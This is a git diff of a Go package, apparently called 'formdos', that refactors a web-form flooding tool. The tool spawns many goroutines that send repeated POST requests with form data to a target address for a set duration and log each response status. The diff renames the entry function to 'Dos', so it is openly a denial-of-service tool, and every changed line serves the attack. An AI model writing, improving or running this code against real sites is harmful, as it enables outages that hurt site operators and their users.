@@ -13,9 +13,8 @@ import (
 )
 
 type ch struct {
-	starter chan struct{}
-	quitter chan struct{}
-	sync    chan int
+	done chan struct{}
+	sync chan int
 }
 
 // TargetInf - struct for webaddress and formnames
@@ -28,7 +27,7 @@ type TargetInf struct {
 }
 
 var (
-	channelStruct    ch
+	globalCh         ch
 	infoIntern       TargetInf
 	authUser         string
 	authPass         string
@@ -85,11 +84,12 @@ func (inf *TargetInf) Copy() TargetInf {
 	return *inf
 }
 
-func makeRequest() {
-
+func makeRequest(done chan<- struct{}) {
 	hc := http.Client{} // Initalize default client
 
-	req := buildRequest() // Building our request
+	result := make(chan *http.Request)
+	go buildRequest(result) // Building our request
+	req := <-result         // Wait for our request
 
 	r := rand.New(rand.NewSource(time.Now().UnixNano()))
 	resp, err := hc.Do(req)
@@ -102,42 +102,58 @@ func makeRequest() {
 	if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
 		log.Printf("%10d | HTTP Status is in the 2xx range : %s\n", r.Uint32(), infoIntern.webaddress)
 	} else {
-		log.Printf("%10d | Argh! Broken : %s\n", r.Uint32(), infoIntern.webaddress)
+		log.Printf("%10d | Argh! Broken [%d] : %s\n", r.Uint32(), resp.StatusCode, infoIntern.webaddress)
 	}
+
+	close(result) // Close request result channel
+	close(done)   // sending empty data to done channel
 }
 
-func runner() {
-	<-channelStruct.starter // Starting routine on close of channel starter
+func runner(start <-chan struct{}) {
+	<-start // Starting routine on close of channel starter
+
 	for {
 		select {
-		case <-channelStruct.quitter: // Quit routine on receive
-			break
+		case <-globalCh.done: // Quit routine on receive
+			return // Close runner goroutine
 		default:
-			makeRequest()
+			func() {
+				done := make(chan struct{})
+				go makeRequest(done)
+				<-done
+			}()
 		}
 	}
 }
 
 func start(n int) {
+	start := make(chan struct{})
+
 	for i := 1; i < n+1; i++ {
 		log.Printf("Starting routine: %d\n", i)
-		go runner()
+		go runner(start)
 	}
+
+	// Building initial request
 	log.Println("Building Initial Request")
-	_ = buildRequest() // Building initial request
-	close(channelStruct.starter)
+	done := make(chan *http.Request) // create channel done
+	go buildRequest(done)            // Building initial request
+	_ = <-done                       // Wait for initial request to be done
+	defer close(done)                // close channel done
+
+	close(start) // close channel starter to start runner routines
 	status := 0
-	channelStruct.sync <- status
+	globalCh.sync <- status
 }
 
-func quit() {
-	close(channelStruct.quitter)
+func done() {
+	close(globalCh.done)
 	time.Sleep(5 * time.Second)
 	status := 0
-	channelStruct.sync <- status
+	globalCh.sync <- status
 }
 
-func buildRequest() *http.Request {
+func buildRequest(result chan<- *http.Request) {
 	// Building initial request and add values to request
 	req, err := http.NewRequest("POST", infoIntern.webaddress, strings.NewReader(infoIntern.formnames.Encode()))
 	if err != nil {
@@ -160,13 +176,12 @@ func buildRequest() *http.Request {
 	} else {
 		req.Header = persistenHeaders
 	}
-	return req
+	result <- req
 }
 
 func buildingDataAndCh(info *TargetInf) {
-	channelStruct.starter = make(chan struct{})
-	channelStruct.quitter = make(chan struct{})
-	channelStruct.sync = make(chan int)
+	globalCh.done = make(chan struct{})
+	globalCh.sync = make(chan int)
 
 	infoIntern = info.Copy() // Build global struct
 
@@ -176,8 +191,8 @@ func buildingDataAndCh(info *TargetInf) {
 	}
 }
 
-// Run function - returns error or nil
-func Run(threads int, timeInSeconds int, info *TargetInf) (err error) {
+// Dos - start Dos and returns error or nil
+func Dos(threads int, timeInSeconds int, info *TargetInf) (err error) {
 	var status int            // Status variable for error management
 	var runTime time.Duration // variable for runtime management
 
@@ -185,8 +200,8 @@ func Run(threads int, timeInSeconds int, info *TargetInf) (err error) {
 
 	buildingDataAndCh(info) // build the datastructure from TargetInf struct and initialize channels
 
-	go start(threads)             // start routines
-	status = <-channelStruct.sync // Wait for start routine
+	go start(threads)        // start routines
+	status = <-globalCh.sync // Wait for start routine
 	if status < 0 {
 		err = fmt.Errorf("error in start() routine of package formdos")
 		return err
@@ -194,8 +209,8 @@ func Run(threads int, timeInSeconds int, info *TargetInf) (err error) {
 
 	time.Sleep(runTime) // Let the routines work for the given duration
 
-	go quit()                     // quit routines
-	status = <-channelStruct.sync // Wait for quit routine
+	go done()                // quit routines
+	status = <-globalCh.sync // Wait for quit routine
 	if status < 0 {
 		err = fmt.Errorf("error in quit() routine of package formdos")
 		return err
